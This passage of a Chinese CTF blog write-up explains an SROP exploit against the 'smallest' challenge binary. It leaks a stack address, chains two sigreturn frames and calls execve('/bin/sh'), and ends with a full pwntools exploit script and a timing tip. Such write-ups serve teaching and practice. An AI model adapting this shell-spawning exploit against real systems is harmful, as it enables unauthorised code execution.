+<p>那么接下来就是需要跳过第一个异或语句了，我们可以看到我们输入的内容进入了rsi寄存器，那么我们可以直接输入0x400b3然后进行</p>
+<p>跳过直接将值传给rsi，然后通过语句mov rsi,rsp来完成跳过</p>
+<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/Srop%E9%A2%98%E5%9E%8B/image-20220217212226199.png?raw=true" alt="image-20220217212226199.png"></p>
+<p>这就是我们要的目的，但要注意我们这里只穿后面一字节，因为前面的内容都一样</p>
+<p>那么我们就可以完成地址的泄露了</p>
+<p>那既然我们发现了rax寄存器的特征就好办了，只要我们输入的内容长度修改为我们需要的长度即可</p>
+<h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><p>1.首先我们要明确自己大概要进行几次输入</p>
+<p>a.通过简单的栈溢出来明确自己输入的次数</p>
+<p>b.完成地址泄露</p>
+<p>c.通过一次srop完成在特定地方写入/bin/sh\x00，为什么不直接写在我们泄露的地方呢，因为每一次read都会覆盖上一次的</p>
+<p>d.这一次我们写入参数，并且这次的srop来完成execve的调用</p>
+<p>1.次数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload &#x3D; p64(read_addr)*3</span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure>
+
+<p>2.泄露地址</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">p.send(&#39;\xb3&#39;)		#控制rax&#x3D;&#x3D;1，完成write调用</span><br><span class="line">stack_addr &#x3D; u64(p.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,&#39;\x00&#39;))</span><br><span class="line">print(hex(stack_addr))</span><br></pre></td></tr></table></figure>
+
+<p>3.为参数写入做准备</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">frame &#x3D; SigreturnFrame()</span><br><span class="line">frame.rax &#x3D; constants.SYS_read</span><br><span class="line">frame.rdi &#x3D; 0</span><br><span class="line">frame.rsi &#x3D; stack_addr</span><br><span class="line">frame.rdx &#x3D; 0x250</span><br><span class="line">frame.rip &#x3D; syscall_ret</span><br><span class="line">frame.rsp &#x3D; stack_addr</span><br><span class="line">frame.rbp &#x3D; stack_addr</span><br><span class="line">payload &#x3D; p64(read_addr) + &#39;a&#39;*8 + str(frame)</span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure>
+
+<p>这里我们发现我们好像还缺了点什么，并且这里的payload为什么还要写个read和填充八字节呢？</p>
+<p>a.为什么写read</p>
+<p>大家有没有发现我们的srop好像万事俱备，但只欠东风了呢，我们这时候还需要传一个rax,并且调用写syscall</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload &#x3D; p64(syscall_ret) + &#39;a&#39;*7</span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure>
+
+<p>那么这个read就是为了我们的调用</p>
+<p>b.那为什么还要填充八字节呢</p>
+<p>因为这里我们调用的的是syscall_ret，并且read的结尾也有一个ret那么是不是说这里我们需要有一个8字节来缓冲一下</p>
+<p>4.完成参数的写入并调用execve</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">frame &#x3D; SigreturnFrame()</span><br><span class="line">frame.rax &#x3D; constants.SYS_execve</span><br><span class="line">frame.rdi &#x3D; stack_addr+0x120</span><br><span class="line">frame.rsi &#x3D; 0</span><br><span class="line">frame.rdx &#x3D; 0</span><br><span class="line">frame.rip &#x3D; syscall_ret</span><br><span class="line">frame.rsp &#x3D; stack_addr</span><br><span class="line">print(len(frame))</span><br><span class="line">payload &#x3D; p64(read_addr) + &#39;a&#39;*8 + str(frame)</span><br><span class="line">payload &#x3D; payload.ljust(0x120,&#39;\x00&#39;) + &#39;&#x2F;bin&#x2F;sh\x00&#39;</span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure>
+
+<p>当然，这里还有一步需要配置rax</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload &#x3D; p64(syscall_ret) + &#39;a&#39;*7</span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure>
+
+<h2 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p &#x3D; process(&#39;smallest&#39;)</span><br><span class="line"></span><br><span class="line">context.arch &#x3D; &#39;amd64&#39;</span><br><span class="line">context.log_level &#x3D; &#39;debug&#39;</span><br><span class="line">syscall_ret &#x3D; 0x4000BE</span><br><span class="line">read_addr &#x3D; 0x4000B0</span><br><span class="line">again_addr &#x3D; 0x4000B3</span><br><span class="line">#1</span><br><span class="line">payload &#x3D; p64(read_addr)*3</span><br><span class="line">p.send(payload)</span><br><span class="line">#2</span><br><span class="line"></span><br><span class="line">#payload&#x3D; p64(again_addr)</span><br><span class="line"></span><br><span class="line">p.send(&#39;\xb3&#39;)</span><br><span class="line">stack_addr &#x3D; u64(p.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,&#39;\x00&#39;))</span><br><span class="line">print(hex(stack_addr))</span><br><span class="line"></span><br><span class="line">#3,srop_1</span><br><span class="line">frame &#x3D; SigreturnFrame()</span><br><span class="line">frame.rax &#x3D; constants.SYS_read</span><br><span class="line">frame.rdi &#x3D; 0</span><br><span class="line">frame.rsi &#x3D; stack_addr</span><br><span class="line">frame.rdx &#x3D; 0x250</span><br><span class="line">frame.rip &#x3D; syscall_ret</span><br><span class="line">frame.rsp &#x3D; stack_addr</span><br><span class="line">frame.rbp &#x3D; stack_addr</span><br><span class="line">payload &#x3D; p64(read_addr) +&#39;a&#39;*8 + str(frame)</span><br><span class="line">p.send(payload)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">#pop_rax</span><br><span class="line">#rax &#x3D; 15&#x2F;0xf &#x3D; 8+7</span><br><span class="line">payload &#x3D; p64(syscall_ret) + &#39;a&#39;*7</span><br><span class="line">p.send(payload)</span><br><span class="line">#srop_2</span><br><span class="line">frame &#x3D; SigreturnFrame()</span><br><span class="line">frame.rax &#x3D; constants.SYS_execve</span><br><span class="line">frame.rdi &#x3D; stack_addr+0x120</span><br><span class="line">frame.rsi &#x3D; 0</span><br><span class="line">frame.rdx &#x3D; 0</span><br><span class="line">frame.rip &#x3D; syscall_ret</span><br><span class="line">frame.rsp &#x3D; stack_addr</span><br><span class="line">print(len(frame))</span><br><span class="line">payload &#x3D; p64(read_addr) + &#39;a&#39;*8 + str(frame)</span><br><span class="line">payload &#x3D; payload.ljust(0x120,&#39;\x00&#39;) + &#39;&#x2F;bin&#x2F;sh\x00&#39;</span><br><span class="line">p.send(payload)</span><br><span class="line">#pop_rax</span><br><span class="line">payload &#x3D; p64(syscall_ret) + &#39;a&#39;*7</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>如果你像在BUU里面复现的话记得在每一次send后面Sleep一会，我睡0.5就可以了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">原因：</span><br><span class="line">因为过快的发送速度会导致read返回的值出现波动</span><br><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;Tokameine&#x2F;article&#x2F;details&#x2F;119974827</span><br></pre></td></tr></table></figure>
+
+</div><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">徐小宇</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://example.com/2022/02/16/Srop%E9%A2%98%E5%9E%8B/">http://example.com/2022/02/16/Srop%E9%A2%98%E5%9E%8B/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2021/10/16/%E2%80%9C%E9%B2%B2%E9%B9%8F%E6%9D%AF%E2%80%9D/"><img class="next-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">“鲲鹏杯”</div></div></a></div></nav></article></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By 徐小宇</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><section id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></section><div><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><div class="js-pjax"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></div></body></html>
